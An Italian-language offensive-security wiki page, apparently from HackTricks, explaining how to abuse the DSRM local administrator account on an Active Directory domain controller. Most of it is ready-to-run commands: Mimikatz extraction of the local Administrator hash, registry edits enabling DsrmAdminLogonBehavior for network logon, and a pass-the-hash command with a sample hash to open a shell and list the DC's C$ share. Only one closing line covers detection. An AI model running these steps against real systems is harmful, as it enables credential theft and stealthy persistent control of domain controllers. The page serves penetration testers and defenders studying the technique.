{{#include ../../banners/hacktricks-training.md}}

# Credenziali DSRM

C'è un account di **amministratore locale** all'interno di ogni **DC**. Avere privilegi di amministratore su questa macchina ti consente di utilizzare mimikatz per **estrarre l'hash dell'Amministratore locale**. Poi, modificando un registro per **attivare questa password** in modo da poter accedere da remoto a questo utente Amministratore locale.\
Prima dobbiamo **estrarre** l'**hash** dell'utente **Amministratore locale** all'interno del DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Quindi dobbiamo controllare se quell'account funzionerà, e se la chiave di registro ha il valore "0" o non esiste, devi **impostarla su "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Quindi, utilizzando un PTH puoi **elencare il contenuto di C$ o persino ottenere una shell**. Nota che per creare una nuova sessione powershell con quell'hash in memoria (per il PTH) **il "dominio" utilizzato è solo il nome della macchina DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Maggiore informazione su questo in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) e [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Mitigazione

- Event ID 4657 - Audit creazione/modifica di `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
